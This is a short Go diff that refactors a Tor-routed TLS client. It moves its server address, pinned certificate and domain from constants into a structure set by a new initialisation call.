@@ -14,15 +14,16 @@ import (
 )
 
 func connect(dialer *tor.Dialer) (net.Conn, error) {
-	conn, err := dialer.Dial("tcp", serverAddr)
+	log.Println("connecting to", s.addr)
+	conn, err := dialer.Dial("tcp", s.addr)
 	if err != nil {
 		return nil, err
 	}
 	log.Println("connect")
 	caPool := x509.NewCertPool()
-	caPool.AppendCertsFromPEM([]byte(serverCert))
+	caPool.AddCert(s.cert)
 
-	config := tls.Config{RootCAs: caPool, ServerName: serverDomain}
+	config := tls.Config{RootCAs: caPool, ServerName: s.domain}
 	tlsconn := tls.Client(conn, &config)
 	if err != nil {
 		return nil, err
@@ -33,6 +34,7 @@ func connect(dialer *tor.Dialer) (net.Conn, error) {
 // NetClient start tor and invoke connect
 func NetClient() {
 	log.Println("NetClient")
+	initServer()
 	var conf tor.StartConf
 	conf = tor.StartConf{ProcessCreator: embedded.NewCreator()}
 
